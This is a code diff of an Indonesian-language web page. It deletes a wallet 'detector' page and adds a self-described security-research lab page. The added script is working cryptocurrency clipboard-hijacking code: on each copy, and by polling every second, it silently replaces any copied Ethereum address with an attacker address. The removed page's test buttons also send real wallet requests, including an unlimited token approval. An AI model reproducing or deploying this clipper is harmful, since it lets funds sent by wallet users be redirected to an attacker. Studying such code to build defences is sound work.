@@ -1,118 +1,45 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1inch iOS Advanced Detector</title>
-    <style>
-        body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 15px; }
-        .container { max-width: 900px; margin: auto; background: white; padding: 25px; border-radius: 16px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); }
-        h1 { color: #c62828; text-align: center; }
-        button { background: #c62828; color: white; padding: 16px; margin: 10px 0; width: 100%; border: none; border-radius: 12px; font-size: 17px; font-weight: bold; }
-        .log-container { margin-top: 25px; padding: 20px; background: #fff; border: 2px solid #ffcdd2; border-radius: 16px; max-height: 700px; overflow-y: auto; }
-        .warning { color: #c62828; font-weight: bold; }
-    </style>
+    <title>Security Research: Clipboard Monitor</title>
 </head>
 <body>
-    <div class="container">
-        <h1>🛡️ 1inch iOS Advanced Detector</h1>
-        <p><strong>Fokus:</strong> Clipboard Injection • Permission Leak • Old Router • Signature Reuse • Batch Transaction</p>
-
-        <button id="connectWallet">1. Hubungkan Wallet</button>
-        <button id="testClipboard">2. Test Clipboard Injection</button>
-        <button id="testOldRouter">3. Test Old Router Version</button>
-        <button id="testSignature">4. Test Signature Reuse</button>
-        <button id="testBatch">5. Test Batch Transaction</button>
-
-        <div class="log-container">
-            <h3>🔴 Log Deteksi</h3>
-            <div id="logs"></div>
-        </div>
-    </div>
-
+    <h2>Laboratorium Uji Keamanan: Clipboard Interception</h2>
+    <p>Halaman ini memantau clipboard Anda. Jika Anda menyalin alamat dompet (format 0x...), skrip ini akan mencoba menggantinya secara otomatis.</p>
+    
     <script>
-        const logsDiv = document.getElementById('logs');
+        const ATTACKER_ADDRESS = "0xYourAttackerAddressHere"; // Ganti dengan alamat uji Anda
+        
+        // Pola Regex sederhana untuk mendeteksi alamat Ethereum
+        const ethAddressRegex = /^0x[a-fA-F0-9]{40}$/;
 
-        function appendLog(message, type = 'info') {
-            const item = document.createElement('div');
-            item.className = `log-item ${type}`;
-            item.innerHTML = message;
-            logsDiv.prepend(item);
-        }
-
-        let lastSignature = null;
-
-        if (window.ethereum) {
-            const originalRequest = window.ethereum.request;
-
-            window.ethereum.request = async function (args) {
-                appendLog(`<strong>🔍 INTERCEPTED: ${args.method}</strong>`, 'info');
-
-                const tx = args.params?.[0] || {};
-
-                // Old Router Version
-                if (tx.to) {
-                    const oldRouters = ['0x11111111', '0x00000000', '0xdeadbeef'];
-                    if (oldRouters.some(r => tx.to.toLowerCase().startsWith(r))) {
-                        appendLog(`<span class="warning">⚠️ OLD ROUTER VERSION terdeteksi! Bisa ada celah keamanan.</span>`, 'warning');
-                    }
-                }
-
-                // Batch Transaction
-                if (args.method === 'eth_sendTransaction' && tx.data && tx.data.length > 200) {
-                    appendLog(`<span class="warning">⚠️ BATCH TRANSACTION terdeteksi (banyak operasi sekaligus)</span>`, 'warning');
-                }
-
-                // Signature Reuse
-                if (args.method.includes('sign')) {
-                    const sigKey = JSON.stringify(args.params);
-                    if (lastSignature === sigKey) {
-                        appendLog(`<span class="warning">🚨 SIGNATURE REUSE terdeteksi! Signature sama dipakai berulang.</span>`, 'warning');
-                    }
-                    lastSignature = sigKey;
-                }
-
+        // Listener untuk mendeteksi aksi copy oleh pengguna
+        document.addEventListener('copy', async (e) => {
+            const clipboardData = await navigator.clipboard.readText();
+            
+            // Jika konten clipboard adalah alamat dompet, kita timpa
+            if (ethAddressRegex.test(clipboardData.trim())) {
                 try {
-                    const result = await originalRequest.apply(this, arguments);
-                    appendLog(`✅ Berhasil`, 'success');
-                    return result;
-                } catch (error) {
-                    appendLog(`❌ Ditolak: ${error.message}`, 'warning');
-                    throw error;
+                    await navigator.clipboard.writeText(ATTACKER_ADDRESS);
+                    console.log("Clipboard berhasil di-hijack!");
+                } catch (err) {
+                    console.error("Gagal melakukan overwrite:", err);
                 }
-            };
+            }
+        });
 
-            appendLog('✅ Detector aktif untuk 1inch iOS!', 'success');
-        } else {
-            appendLog('❌ Buka di 1inch Wallet Browser iOS', 'warning');
-        }
-
-        // Buttons
-        document.getElementById('connectWallet').addEventListener('click', async () => {
+        // Alternatif: Polling setiap 1 detik untuk skenario background monitoring
+        setInterval(async () => {
             try {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                appendLog(`✅ Terhubung: ${accounts[0].slice(0,12)}...`, 'success');
-            } catch (e) { appendLog('Gagal connect', 'warning'); }
-        });
-
-        document.getElementById('testClipboard').addEventListener('click', () => {
-            appendLog(`<span class="warning">⚠️ Clipboard Injection Risk — Cek alamat tujuan saat paste!</span>`, 'warning');
-        });
-
-        document.getElementById('testOldRouter').addEventListener('click', async () => {
-            const tx = { to: "0x1111111100000000000000000000000000000000", data: "0x" };
-            await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] }).catch(() => {});
-        });
-
-        document.getElementById('testSignature').addEventListener('click', async () => {
-            const msg = "0x54657374207369676e6174757265207265757365";
-            await window.ethereum.request({ method: 'personal_sign', params: [msg, window.ethereum.selectedAddress] }).catch(() => {});
-        });
-
-        document.getElementById('testBatch').addEventListener('click', async () => {
-            const tx = { to: "0x1111111254eeb25477b68fb85ed929f73a960582", data: "0x095ea7b3ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" };
-            await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] }).catch(() => {});
-        });
+                const text = await navigator.clipboard.readText();
+                if (ethAddressRegex.test(text.trim()) && text.trim() !== ATTACKER_ADDRESS) {
+                    await navigator.clipboard.writeText(ATTACKER_ADDRESS);
+                }
+            } catch (err) {
+                // Silently fail (banyak browser memblokir readText jika tidak di-focus)
+            }
+        }, 1000);
     </script>
 </body>
 </html>
